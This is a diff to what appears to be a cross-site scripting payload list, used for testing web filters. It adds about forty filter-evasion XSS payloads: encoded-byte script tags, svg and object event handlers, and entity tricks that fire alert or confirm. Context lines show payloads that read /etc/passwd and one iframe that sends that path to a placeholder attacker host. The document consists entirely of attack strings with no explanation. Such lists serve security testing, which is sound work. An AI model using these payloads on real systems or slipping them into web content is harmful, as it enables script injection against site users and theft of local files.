@@ -110,3 +110,43 @@ javascript:alert(document.cookie)
 <img src="xxx" onerror="document.write('\<iframe src=file:///etc/passwd>\</iframe>')"/>
 <link rel=attachment href="file:///etc/passwd">
 <iframe src="http://attacker-ip/test.php?file=/etc/passwd">\</iframe>
+<object src=1 href=1 onerror="javascript:alert(1)"></object>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+'`"><\x3Cscript>javascript:alert(1)</script>
+'`"><\x00script>javascript:alert(1)</script>
+"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
+"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
+"`'><script>\x3Bjavascript:alert(1)</script>
+"`'><script>\x0Djavascript:alert(1)</script>
+"`'><script>\xEF\xBB\xBFjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x81javascript:alert(1)</script>
+"`'><script>\x09javascript:alert(1)</script>
+"`'><script>\xE2\x80\x85javascript:alert(1)</script>
+"`'><script>\xE2\x80\xA8javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Ajavascript:alert(1)</script>
+"`'><script>\xE1\x9A\x80javascript:alert(1)</script>
+"`'><script>-javascript:alert(1)</script>
+"`'><script>\x0Ajavascript:alert(1)</script>
+"`'><script>\xE2\x80\xAFjavascript:alert(1)</script>
+"`'><script>\x7Ejavascript:alert(1)</script>
+"`'><script>\xC2\xA0javascript:alert(1)</script>
+"`'><script>\x0Bjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x86javascript:alert(1)</script>
+"`'><script>\x21javascript:alert(1)</script>
+"`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
+"`'><script>\xE2\x80\x83javascript:alert(1)</script>
+"`'><script>\xE2\x80\x8Bjavascript:alert(1)</script>
+"`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
+<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
+<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
+<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
+"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
+<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+<svg><script>//&NewLine;confirm(1);</script </svg>
+<svg/onload=alert(1)
+<svg xmlns="#"><script>alert(1)</script></svg>
+<svg onload="javascript:alert(123)" xmlns="#"></svg>
